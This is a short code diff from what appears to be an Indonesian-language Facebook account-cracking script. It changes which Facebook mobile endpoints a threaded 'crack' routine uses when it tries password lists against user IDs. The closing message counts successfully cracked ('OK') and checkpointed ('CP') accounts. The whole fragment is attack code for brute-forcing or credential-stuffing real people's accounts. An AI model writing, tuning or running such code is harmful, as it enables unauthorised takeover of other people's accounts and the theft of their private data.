@@ -686,11 +686,11 @@ def gabung():
 			if 'mobile' in metode:
 				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
 			elif 'mbasic' in metode:
-				babas.submit(crack,idf,pwx,"touch.facebook.com",awal)
+				babas.submit(crack,idf,pwx,"mbasic.facebook.com",awal)
 			elif 'free' in metode:
-				babas.submit(crack,idf,pwx,"free.facebook.com",awal)
+				babas.submit(crack,idf,pwx,"d.facebook.com",awal)
 			else:
-				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
+				babas.submit(crack,idf,pwx,"mbasic.facebook.com",awal)
 	sleep(5)
 	exit(f'\r [{hh}<{P}] crack telah selesai jumlah OK:{ok} jumlah CP:{cp} ')
 				
